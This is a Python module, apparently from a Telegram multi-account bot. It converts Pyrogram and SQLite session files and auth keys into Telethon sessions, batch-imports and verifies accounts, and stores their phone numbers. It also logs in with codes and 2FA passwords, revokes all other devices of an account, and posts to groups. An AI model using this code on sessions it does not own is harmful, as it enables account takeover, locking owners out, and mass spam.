import asyncio
import base64
import json
import struct
import socket
import os
from typing import Optional, Tuple, Dict, Any
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import (
    FloodWaitError,
    PhoneCodeInvalidError,
    PhoneCodeExpiredError,
    PhoneNumberInvalidError,
    SessionPasswordNeededError,
    PasswordHashInvalidError,
    AuthKeyUnregisteredError,
    AuthKeyDuplicatedError,
    SessionRevokedError,
    UserDeactivatedError,
)
from telethon.tl.functions.account import (
    GetAuthorizationsRequest,
    ResetAuthorizationRequest,
    GetPasswordRequest,
    CheckPasswordRequest
)
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.password import compute_check
from config import API_ID, API_HASH
import database
import logging

logger = logging.getLogger(__name__)

# ==================== الثوابت ====================
_TG_DC = {
    1: ("149.154.175.53", 443),
    2: ("149.154.167.51", 443),
    3: ("149.154.175.100", 443),
    4: ("149.154.167.91", 443),
    5: ("91.108.56.130", 443),
}

# ==================== أدوات التحويل ====================

def pyrogram_json_to_telethon(data: Dict[str, Any]) -> Optional[str]:
    """تحويل صيغة Pyrogram JSON إلى Telethon StringSession"""
    try:
        dc_id = int(data.get("dc_id", 0))
        auth_hex = data.get("auth_key", "").strip()
        
        if not dc_id or not auth_hex:
            return None
            
        auth_key = bytes.fromhex(auth_hex)
        if len(auth_key) != 256:
            return None
            
        ip, port = _TG_DC.get(dc_id, ("149.154.167.51", 443))
        packed = struct.pack(
            ">B4sH256s",
            dc_id,
            socket.inet_aton(ip),
            port,
            auth_key
        )
        return "1" + base64.urlsafe_b64encode(packed).decode("ascii")
        
    except Exception as e:
        logger.error(f"تحويل Pyrogram فشل: {e}")
        return None

def parse_session_string(session_input: Any) -> Optional[str]:
    """تحويل أي صيغة جلسة إلى StringSession"""
    if isinstance(session_input, str):
        if session_input.strip().startswith("{"):
            try:
                data = json.loads(session_input)
                return parse_session_string(data)
            except:
                pass
                
        try:
            decoded = base64.b64decode(session_input)
            return decoded.decode("utf-8")
        except:
            pass
            
        if ":" in session_input and len(session_input.split(":")) == 2:
            hex_part, dc_part = session_input.split(":")
            if len(hex_part) == 512 and dc_part.isdigit():
                return pyrogram_json_to_telethon({
                    "dc_id": int(dc_part),
                    "auth_key": hex_part
                })
                
        if len(session_input) > 10:
            return session_input
            
    elif isinstance(session_input, dict):
        if "dc_id" in session_input and "auth_key" in session_input:
            return pyrogram_json_to_telethon(session_input)
            
        for key in ["session_string", "session", "string_session"]:
            if key in session_input:
                return parse_session_string(session_input[key])
                
    return None

# ==================== دوال الجلسات الأساسية ====================

def run_async(coro):
    """تشغيل دالة غير متزامنة في بيئة متزامنة"""
    try:
        loop = asyncio.get_running_loop()
    except RuntimeError:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
    return loop.run_until_complete(coro)

async def test_session(session_string: str) -> Tuple[bool, Optional[dict]]:
    """اختبار صلاحية الجلسة"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, {"error": "الجلسة غير مصرح بها"}
            
        me = await client.get_me()
        await client.disconnect()
        
        return True, {
            "id": me.id,
            "phone": me.phone,
            "username": me.username,
            "first_name": me.first_name,
            "last_name": me.last_name,
            "is_bot": me.bot,
            "premium": getattr(me, "premium", False)
        }
        
    except Exception as e:
        return False, {"error": str(e)}

async def send_code_sync(phone: str) -> Tuple[bool, str, Optional[str]]:
    """إرسال كود التفعيل"""
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        result = await client.send_code_request(phone)
        await client.disconnect()
        
        return True, "✅ تم إرسال كود التفعيل", result.phone_code_hash
        
    except FloodWaitError as e:
        return False, f"⏳ انتظر {e.seconds} ثانية", None
    except PhoneNumberInvalidError:
        return False, "❌ رقم هاتف غير صحيح", None
    except Exception as e:
        return False, f"❌ خطأ: {str(e)}", None

async def sign_in_sync(phone: str, code: str, phone_code_hash: str) -> Tuple[bool, str, Optional[str]]:
    """تسجيل الدخول باستخدام الكود"""
    try:
        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            await client.sign_in(phone, code, phone_code_hash=phone_code_hash)
        except SessionPasswordNeededError:
            await client.disconnect()
            return False, "🔒 مطلوب كلمة مرور التحقق بخطوتين", "2FA_REQUIRED"
            
        session_string = client.session.save()
        await client.disconnect()
        
        return True, "✅ تم تسجيل الدخول بنجاح", session_string
        
    except PhoneCodeInvalidError:
        return False, "❌ كود غير صحيح", None
    except PhoneCodeExpiredError:
        return False, "❌ انتهت صلاحية الكود", None
    except Exception as e:
        return False, f"❌ خطأ: {str(e)}", None

async def sign_in_with_2fa(session_string: str, password: str) -> Tuple[bool, str]:
    """تسجيل الدخول باستخدام كلمة مرور 2FA"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        await client.sign_in(password=password)
        new_session = client.session.save()
        await client.disconnect()
        
        return True, new_session
        
    except PasswordHashInvalidError:
        return False, "❌ كلمة مرور غير صحيحة"
    except Exception as e:
        return False, f"❌ خطأ: {str(e)}"

# ==================== دوال الأمان ====================

async def kick_all_sessions(session_string: str) -> Tuple[bool, str]:
    """طرد جميع الجلسات الأخرى"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, "الجلسة غير مصرح بها"
            
        await client(ResetAuthorizationsRequest())
        
        devices = await client(GetAuthorizationsRequest())
        device_count = len(devices.authorizations) if devices else 0
        
        await client.disconnect()
        
        return True, f"تم طرد جميع الجلسات (بقي {device_count} جهاز)"
        
    except Exception as e:
        return False, str(e)

async def get_device_count(session_string: str) -> int:
    """الحصول على عدد الأجهزة المسجلة"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return -1
            
        devices = await client(GetAuthorizationsRequest())
        await client.disconnect()
        
        return len(devices.authorizations)
        
    except Exception:
        return -1

async def get_device_details(session_string: str) -> list:
    """الحصول على تفاصيل جميع الأجهزة"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return []
            
        result = await client(GetAuthorizationsRequest())
        devices = []
        
        for auth in result.authorizations:
            devices.append({
                "hash": auth.hash,
                "current": auth.current,
                "device": auth.device_model or "غير معروف",
                "app": auth.app_name or "غير معروف",
                "platform": auth.platform or "",
                "country": auth.country or "",
                "date_created": auth.date_created,
                "date_active": auth.date_active,
                "ip": getattr(auth, "ip", "")
            })
            
        await client.disconnect()
        return devices
        
    except Exception:
        return []

async def kick_device(session_string: str, device_hash: int) -> Tuple[bool, str]:
    """طرد جهاز معين"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, "الجلسة غير مصرح بها"
            
        await client(ResetAuthorizationRequest(hash=device_hash))
        await client.disconnect()
        
        return True, "تم طرد الجهاز بنجاح"
        
    except Exception as e:
        return False, str(e)

# ==================== دوال الإرسال ====================

async def send_message_sync(session_string: str, group_link: str, message: str) -> Tuple[bool, Any]:
    """إرسال رسالة إلى كروب"""
    try:
        client = TelegramClient(StringSession(session_string), API_ID, API_HASH)
        await client.connect()
        
        if not await client.is_user_authorized():
            await client.disconnect()
            return False, "الجلسة غير مصرح بها"
            
        entity = await client.get_entity(group_link)
        result = await client.send_message(entity, message)
        await client.disconnect()
        
        return True, result
        
    except Exception as e:
        return False, str(e)

# ==================== استيراد الجلسات ====================

async def import_session_file(file_path: str) -> Dict[str, Any]:
    """استيراد جلسة من ملف"""
    try:
        with open(file_path, "rb") as f:
            file_bytes = f.read()
            
        file_name = os.path.basename(file_path)
        ext = os.path.splitext(file_name)[1].lower()
        
        if ext == ".session":
            return await _import_sqlite_session(file_bytes, file_name)
            
        elif ext in [".json", ".txt"]:
            try:
                text = file_bytes.decode("utf-8")
                return await _import_text_session(text, file_name)
            except:
                pass
                
        return {"success": False, "error": "نوع الملف غير مدعوم"}
        
    except Exception as e:
        return {"success": False, "error": str(e)}

async def _import_sqlite_session(data: bytes, filename: str) -> Dict[str, Any]:
    """استيراد جلسة SQLite"""
    try:
        import tempfile
        import sqlite3
        
        with tempfile.NamedTemporaryFile(suffix=".session", delete=False) as tf:
            tf.write(data)
            tf_path = tf.name
            
        conn = sqlite3.connect(tf_path)
        cursor = conn.cursor()
        
        cursor.execute("SELECT dc_id, server_address, port, auth_key FROM sessions LIMIT 1")
        row = cursor.fetchone()
        
        if row:
            dc_id, server_addr, port, auth_key = row
            if len(auth_key) == 256:
                session = parse_session_string({
                    "dc_id": dc_id,
                    "auth_key": auth_key.hex()
                })
                conn.close()
                os.unlink(tf_path)
                return await _verify_and_save_session(session, filename)
                
        conn.close()
        os.unlink(tf_path)
        return {"success": False, "error": "لم يتم العثور على بيانات جلسة صالحة"}
        
    except Exception as e:
        return {"success": False, "error": str(e)}

async def _import_text_session(text: str, filename: str) -> Dict[str, Any]:
    """استيراد جلسة من نص"""
    try:
        session = parse_session_string(text)
        if not session:
            return {"success": False, "error": "صيغة جلسة غير صالحة"}
            
        return await _verify_and_save_session(session, filename)
        
    except Exception as e:
        return {"success": False, "error": str(e)}

async def _verify_and_save_session(session_string: str, filename: str) -> Dict[str, Any]:
    """التحقق من الجلسة وحفظها"""
    try:
        success, info = await test_session(session_string)
        
        if not success:
            return {"success": False, "error": info.get("error", "جلسة غير صالحة")}
            
        phone = info.get("phone")
        if not phone:
            return {"success": False, "error": "لم يتم العثور على رقم الهاتف"}
            
        if database.add_account(phone, session_string):
            return {
                "success": True,
                "phone": phone,
                "info": info,
                "session": session_string
            }
        else:
            return {"success": False, "error": "فشل حفظ الجلسة في قاعدة البيانات"}
            
    except Exception as e:
        return {"success": False, "error": str(e)}

# ==================== استيراد دفعة ====================

async def import_sessions_batch(sessions_data: list) -> Dict[str, Any]:
    """استيراد دفعة من الجلسات"""
    results = {
        "total": len(sessions_data),
        "success": [],
        "failed": []
    }
    
    for idx, data in enumerate(sessions_data):
        try:
            session = parse_session_string(data)
            if not session:
                results["failed"].append({
                    "index": idx,
                    "error": "صيغة غير صالحة"
                })
                continue
                
            result = await _verify_and_save_session(session, f"batch_{idx}")
            
            if result["success"]:
                results["success"].append({
                    "index": idx,
                    "phone": result["phone"]
                })
            else:
                results["failed"].append({
                    "index": idx,
                    "error": result.get("error", "فشل الاستيراد")
                })
                
        except Exception as e:
            results["failed"].append({
                "index": idx,
                "error": str(e)
            })
            
    return results
